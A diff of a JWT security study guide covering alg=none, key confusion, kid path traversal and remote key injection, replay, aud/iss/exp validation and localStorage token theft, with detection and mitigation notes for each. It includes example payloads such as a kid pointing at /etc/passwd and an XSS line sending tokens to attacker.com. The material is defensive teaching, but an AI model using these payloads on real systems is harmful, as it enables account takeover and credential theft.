@@ -44,16 +44,55 @@ Attacker changes it to:
 role=admin
 Since verification is disabled, the application trusts the modified claim.
 
--> Why this happens in real systems:
-Because developers treat JWT as encrypted data, when it is actually signed data.
-Anyone can read and modify the payload.
-Only the signature verification ensures integrity.
+⚙️ How it actually works (internals)
+A JWT is:
+HEADER.PAYLOAD.SIGNATURE
+Example:
+HEADER:  {"alg":"HS256"}
+PAYLOAD: {"user":"alice","role":"user"}
+SIGNATURE: HMAC(secret, header + payload)
+Important truth:
+👉 The payload is NOT protected by default
+👉 It is only protected if and after signature verification succeeds
 
--> Correct mitigation:
-• Always verify the token before reading claims.
-  Example:
-  payload = jwt.decode(token, secret, algorithms=["HS256"])
-• Never allow payload access before verification.
+-> What correct verification looks like internally:
+1. Receive token
+2. Recompute signature using server secret
+3. Compare with token signature
+4. If match → trust payload
+
+-> What broken apps do:
+1. Decode token
+2. Read payload
+3. Use role/permissions
+4. (Maybe verify later or never)
+This is the core bug.
+
+💣 Exploitation (step-by-step):
+Original token:
+{"user":"alice","role":"user"}
+Attacker modifies:
+{"user":"alice","role":"admin"}
+Signature is now invalid.
+BUT…
+If app does:
+payload = decode(token, verify=False)
+if payload["role"] == "admin":
+    grant_access()
+👉 You just got admin without any key.
+
+🔍 Detection:
+You look for:
+	• Libraries used with verify=False
+	• Manual base64 decoding
+	• Access decisions before verification
+Runtime sign:
+👉 Tampered token still works
+
+🛡️ Mitigation:
+	• Always use safe library defaults
+	• Never manually decode before verify
+	• Reject token if verification fails
 
 2. What is the "alg=none" vulnerability and why was it historically dangerous?
 This is one of the most famous JWT issues.
@@ -66,14 +105,16 @@ Example:
 }
 The server verifies the signature using HS256.
 
--> The historical vulnerability:
-Some libraries supported this header:
-{
- "alg": "none"
-}
-Meaning:
-Token is NOT signed
-The library assumed the application wanted unsigned tokens.
+⚙️ How it works internally
+JWT libraries historically supported:
+
+Signed tokens
+Unsigned tokens
+
+So they allowed:
+HEADER: {"alg":"none"}
+PAYLOAD: {"user":"admin"}
+SIGNATURE: (empty)
 
 -> Attack flow:
 Attacker takes a valid token:
@@ -92,10 +133,10 @@ Now the attacker becomes admin.
 Developers relied on the algorithm defined inside the token, which is attacker-controlled.
 
 -> Correct mitigation:
-Never trust the token header.
-Force the algorithm on the server:
+• Never trust the token header.
+• Hardcode allowed algorithms server-side
 allowed_algorithms = ["RS256"]
-Reject everything else.
+• Disable none
 
 3. What is the RSA → HMAC key confusion attack?
 -> It happens when applications support both symmetric and asymmetric algorithms.
@@ -149,34 +190,40 @@ Example:
  "kid": "key1"
 }
 The server uses it to select a key from a key store.
-
--> Typical implementation:
 key = keystore[kid]
 verify(token, key)
 
--> The vulnerability:
+The attacker manipulates the kid field to control which key the server loads.
+
+💣 Exploitation paths:
 If the kid value is not validated, attackers can manipulate it.
-Example:
+Attack 1: Path traversal:
 kid = "../../../../etc/passwd"
-The server may try to load:
-/etc/passwd
-as the signing key.
+Server loads system file as key.
 This becomes **Path Traversal via JWT.
 
--> Another dangerous pattern:
+Attack 2: Remote key injection:
 Some systems fetch keys remotely.
-kid: https://evil.com/key
-Server downloads attacker-controlled keys.
-
--> Result:
+kid = "https://attacker.com/key"
+Server downloads attacker key.
 Attacker signs tokens with their own key and the server trusts them.
 
--> Mitigation:
-• Strictly validate kid.
-• Only allow predefined keys:
-if kid not in keystore:
-    reject
-• Never fetch remote keys based on token input.
+Attack 3: Null byte / injection:
+Manipulate parsing logic to bypass checks.
+
+🔍 Detection:
+	• Fuzz kid parameter
+	• Try file paths, URLs
+	• Observe server behavior
+
+🛡️ Mitigation:
+	• Only allow predefined keys
+		if kid not in keystore:
+	    reject
+	• No dynamic lookup
+	• No filesystem access based on kid
+	• Strictly validate kid.
+	• Never fetch remote keys based on token input.
 
 5. Why is storing sensitive data inside JWT dangerous?
 Many developers misuse JWT as a secure storage mechanism.
@@ -214,12 +261,236 @@ If the site has Cross‑Site Scripting (XSS), attackers steal tokens instantly.
 -> Mitigation:
 JWT payload should contain minimal claims.
 Example:
-user_id
-token_id
-expiry
+• user_id
+• token_id
+• expiry
 Sensitive data should be retrieved from the server.
 
-The deep mental model (this is what interviewers want)
+7. Why is JWT replay a serious problem even when the signature is valid?
+A replay attack happens when an attacker captures a valid JWT and reuses it later to impersonate the user.
+
+⚙️ How JWT is supposed to work:
+JWT is stateless.
+Server does NOT store session.
+Token itself proves identity.
+
+So every request:
+Client → Server (JWT)
+Server → verifies signature → allows access
+
+💣 Exploitation:
+Imagine this scenario:
+User logs in on public Wi-Fi
+Attacker intercepts JWT (via:
+• HTTP (no TLS)
+• logs
+• browser storage + XSS)
+Now attacker has:
+• valid JWT
+• valid signature
+• valid claims
+
+They send:
+Authorization: Bearer <stolen_token>
+
+Server verifies:
+✔ Signature valid
+✔ Token not expired
+👉 Access granted
+
+Key realization:
+JWT does NOT prove: Who is sending the request
+It only proves: Token was issued by trusted authority
+
+🔍 Detection:
+Same token used from:
+• multiple IPs
+• different geographies
+• unusual concurrent sessions
+
+🛡️ Mitigation:
+1. Short expiration
+exp = 15 minutes
+2. Token binding (advanced)
+Bind token to:
+device / TLS session / client cert
+3. jti (token ID) tracking
+Store token ID in DB
+Reject reused tokens (for sensitive flows)
+4. Refresh token rotation
+
+Invalidate old tokens when new ones are issued.
+
+JWT replay attacks occur because tokens are bearer credentials; possession equals authorization, so without binding or short lifetimes, stolen tokens remain valid.
+
+7. Why is missing or weak aud (audience) validation dangerous?
+The aud claim defines: Who the token is intended for
+
+⚙️ How it works:
+Example:
+{
+ "user": "alice",
+ "aud": "payments-api"
+}
+
+💣 Exploitation:
+Imagine:
+Company has:
+Service A → internal API
+Service B → public API
+
+Attacker gets token for:
+aud = "service-A"
+But Service B does NOT validate aud.
+Attacker sends token to Service B.
+👉 Service B accepts it.
+
+🤯 Why this is dangerous?
+Token issued for one system is used in another system.
+This breaks:
+Service isolation
+
+🔍 Detection:
+Check if services validate aud
+Try using token across services
+
+🛡️ Mitigation:
+Each service must:
+if token.aud != expected:
+    reject
+
+In microservices:JWT flows across services.
+Without aud, tokens become universal passports.
+Audience validation ensures tokens are used only by intended services; without it, tokens can be replayed across trust boundaries.
+
+8. Why is improper expiration (exp) and clock skew handling risky?
+JWT expiration controls how long a token is valid.
+
+⚙️ How it works
+{
+ "exp": 1700000000
+}
+
+Server checks:
+current_time < exp
+
+💣 Exploitation scenarios:
+Scenario 1: No expiration:
+Token valid forever
+If leaked → permanent compromise
+
+Scenario 2: Long expiration:
+exp = 30 days
+Attacker has huge window
+
+Scenario 3: Clock skew abuse:
+Servers allow:
+±5 minutes tolerance
+Attacker uses expired token within skew window.
+
+🤯 Subtle issue:
+Some systems:
+Ignore exp if parsing fails
+
+🔍 Detection:
+• Tokens without exp
+• Very long lifetimes
+• inconsistent time validation
+
+🛡️ Mitigation:
+Always require exp
+Keep it short (minutes, not days)
+Use nbf (not before)
+
+Expiration is the only built-in revocation mechanism in JWT, so improper handling directly increases attack window.
+
+9. Why is improper issuer (iss) validation dangerous?
+iss defines: Who issued the token
+
+⚙️ Example
+{
+ "iss": "https://auth.company.com"
+}
+
+💣 Exploitation:
+Imagine your system trusts tokens from:
+auth.company.com
+But does NOT validate iss.
+
+Attacker creates token from:
+https://evil.com
+Signs it with their own key.
+
+If server skips issuer check:
+👉 Token is accepted
+
+🤯 Why this happens:
+Developers only check:
+signature is valid
+But forget:
+👉 valid according to WHOM?
+
+🔍 Detection:
+Try tokens from different issuers
+Check if system rejects them
+
+🛡️ Mitigation:
+Strict check:
+if token.iss != trusted_issuer:
+    reject
+
+Signature validation without issuer validation can lead to trusting tokens from untrusted identity providers.
+
+10. Why is storing JWT in localStorage dangerous?
+JWT stored in:
+localStorage
+is accessible via JavaScript.
+
+⚙️ How it works:
+localStorage.getItem("token")
+
+💣 Exploitation:
+If application has:
+👉 Cross-Site Scripting (XSS)
+Attacker injects:
+fetch("https://attacker.com?token=" + localStorage.token)
+Now attacker has JWT.
+
+🤯 Why this is severe:
+JWT = authentication
+So stealing it = full account takeover
+
+🔍 Detection:
+Check storage mechanism
+Test XSS
+Observe token exfiltration
+
+🛡️ Mitigation:
+Use:
+HttpOnly cookies
+Why?
+JS cannot access cookies
+Also:
+Secure flag
+SameSite
+
+
+🧠 Final Pattern (this is what will stay with you)
+These 5 introduce new dimensions beyond crypto:
+
+1. Replay & lifecycle issues
+→ JWT is reusable
+
+2. Context validation failures
+→ aud, iss missing
+
+3. Time-based weaknesses
+→ exp misused
+
+4. Storage layer vulnerabilities
+→ localStorage + XSS
+
+->The deep mental model (this is what interviewers want)
 JWT problems usually come from three architectural mistakes:
 1. Trusting client-controlled data:
 The header and payload are attacker-controlled inputs.
@@ -227,5 +498,94 @@ The header and payload are attacker-controlled inputs.
 Algorithm confusion and key misuse break signature verification.
 3. Treating JWT like secure storage:
 JWT is a transport container, not a database.
+
+6.Where does the “server secret” come from?
+The secret is NOT inside the JWT.
+👉 It is pre-configured on the server.
+Think of it like this:
+
+JWT = message
+Secret = password known only to server
+Signature = proof message was created using that password
+
+🏗️ There are TWO real-world cases:
+Case 1: Your own application issues JWT (HS256):
+This is the simplest case.
+🔐 Where does the secret come from?
+The server defines it.
+Example:
+SECRET_KEY = "my_super_secret_123"
+This is stored in:
+• environment variables
+• secrets manager (AWS Secrets Manager, Vault)
+• config files (not recommended)
+
+⚙️ Token creation (Login flow):
+User logs in:
+User → Server: username/password
+Server verifies credentials, then creates JWT:
+token = jwt.sign(
+  payload={"user":"alice","role":"user"},
+  secret=SECRET_KEY,
+  algorithm="HS256"
+)
+
+🔐 What is signature here?
+HMAC(secret, header + payload)
+So:
+signature = HMAC("my_super_secret_123", data)
+
+⚙️ Verification later:
+User sends request:
+Authorization: Bearer <token>
+
+Server does:
+jwt.verify(token, SECRET_KEY)
+
+Internally:
+1. Extract header + payload
+2. Recompute signature using SECRET_KEY
+3. Compare with token signature
+
+If match → token is valid.
+
+👉 The same secret is used for:
+• signing
+• verification
+
+That’s why it’s called symmetric crypto.
+
+Case 2: External Identity Provider (RS256):
+This is what happens in real systems (OAuth, SSO, Google login).
+
+🔐 Who creates the token?
+Not your app.
+Example providers:
+Google
+Microsoft
+Auth0
+
+🔐 Where is the “secret” now?
+There is NO shared secret.
+Instead:
+Private key → used by IdP to sign
+Public key  → used by your server to verify
+
+⚙️ Flow:
+Step 1: User logs in via IdP
+	User → Google login page
+Step 2: IdP issues JWT
+	JWT signed with PRIVATE KEY
+Step 3: Your server verifies
+	jwt.verify(token, public_key)
+
+👉 Your server never knows the private key. It only has:
+public key (downloaded from IdP)
+
+🔍 Where does public key come from?
+From a standard endpoint:
+https://idp.com/.well-known/jwks.json
+This is called JWKS (JSON Web Key Set).
+
 
 Most JWT vulnerabilities arise when applications trust attacker-controlled token fields such as alg, kid, or payload claims without enforcing strict server-side validation and cryptographic verification.
